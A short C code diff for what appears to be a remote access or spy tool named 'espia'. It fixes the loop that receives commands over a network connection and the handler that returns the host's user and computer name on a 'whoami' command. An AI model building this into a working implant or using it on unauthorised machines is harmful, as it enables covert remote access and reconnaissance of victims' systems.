@@ -28,18 +28,19 @@ int main() {
 
     /* Main flow of the program, command recieving, parsing */
     CHAR recv_buff[BUFF_SIZE];
-    CHAR send_buff[BUFF_SIZE];
-    memset(send_buff, 0, BUFF_SIZE);
     int cmd_size = -1;
-    while (strcmp(recv_buff, "exit") || cmd_size != 0) {
+    while (strcmp(recv_buff, "exit") && cmd_size != 0) {
         memset(recv_buff, 0, BUFF_SIZE);
         cmd_size = espia_recv(&connection, recv_buff, BUFF_SIZE);
         memset(recv_buff + cmd_size - 1, 0, 1);
 
         if (strcmp(recv_buff, "whoami") == 0) {
-            whoami(send_buff, BUFF_SIZE);
-            espia_send(&connection, send_buff, BUFF_SIZE);
+            WCHAR whoami_buff[256 + MAX_COMPUTERNAME_LENGTH + 2];
+            memset(whoami_buff, 0, sizeof(whoami_buff));
+            whoami(whoami_buff, sizeof(whoami_buff));
+            espia_send(&connection, whoami_buff, sizeof(whoami_buff));
         }
+
     }
     /* ---------------------------------------------------- */
 
